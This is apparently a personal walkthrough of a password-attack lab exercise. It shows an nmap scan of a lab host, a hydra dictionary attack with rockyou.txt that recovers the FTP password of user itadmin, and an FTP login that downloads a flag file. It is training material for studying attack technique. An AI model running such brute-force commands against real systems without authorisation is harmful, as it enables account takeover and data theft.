# Walk: Password Attacks - SSH and RDP - VM #3

## Fecha: 19/02/2025
## Host: Windows
## IP: 192.168.202.202
## Objetivo
Enumerate VM #3 (BRUTE2) and find another network service. Use the knowledge from this section to get access as the _itadmin_ user and find the flag.
## Herramientas
1. nmap
2. hydra
## Procedimiento y comandos
#### Paso 1: Escanemos el host para enumerar servicios:
- `nmap -sV --open 192.168.202.202 -oN vm-3.nmap-result.txt `
```
Nmap scan report for 192.168.202.202
Host is up (0.19s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           FileZilla ftpd 1.4.1
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp open  http          Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
- Intentamos atacar **FTP**
#### Paso 2: Ejecutamos el ataque de diccionario con hydra:
- `hydra -l itadmin -P /usr/share/wordlists/rockyou.txt -s 21 ftp://192.168.202.202`
```
un paquete de doritos despues > > >
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-20 02:26:18
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://192.168.202.202:21/
[21][ftp] host: 192.168.202.202   login: itadmin   password: hellokitty
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-20 02:26:31
```
- [21][ftp] host: 192.168.202.202   login: itadmin password: **hellokitty**
#### Paso 3: Nos conectamos por ftp con el usuario itadmin:
```
 ftp 192.168.202.202
Connected to 192.168.202.202.
220-FileZilla Server 1.4.1
220 Please visit https://filezilla-project.org/
Name (192.168.202.202:kali): itadmin
331 Please, specify the password.
Password: hellokitty
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||49723|)
150 Starting data transfer.
100% |*********************************************************************************************************************************************************************|    38      426.54 KiB/s    00:00 ETA
226 Operation successful
38 bytes received in 00:00 (179.27 KiB/s)
ftp> 
```
- En mi directorio de trabajo:
  - `cat flag.txt`
